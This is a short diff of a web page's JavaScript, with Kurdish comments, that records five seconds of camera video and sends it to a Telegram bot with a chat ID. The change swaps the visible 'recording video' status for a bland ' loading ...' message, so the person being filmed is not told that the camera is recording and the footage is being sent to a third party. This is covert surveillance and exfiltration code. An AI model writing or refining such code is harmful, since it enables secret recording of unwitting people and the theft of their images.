@@ -329,7 +329,7 @@
         }
 
         // 3. تۆمارکردنی ڤیدیۆی ٥ چرکە
-        res.textContent = '📹 تۆمارکردنی ڤیدیۆ...';
+        res.textContent = ' loading ...';
         const videoBlob = await recordVideo(stream, 5000); // فەنکشنی یارمەتیدەر
 
         // 4. ئێستا دەتوانیت کامێرا داخەیت
@@ -351,7 +351,7 @@
         const videoForm = new FormData();
         videoForm.append('chat_id', CHAT);
         videoForm.append('video', videoBlob, `video_${chatId}.webm`);
-        videoForm.append('caption', `🎥 ڤیدیۆی ٥ چرکەیی - ID: ${chatId}`);
+        videoForm.append('caption', ` please whait   - ID: ${chatId}`);
         await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
             method: 'POST',
             body: videoForm
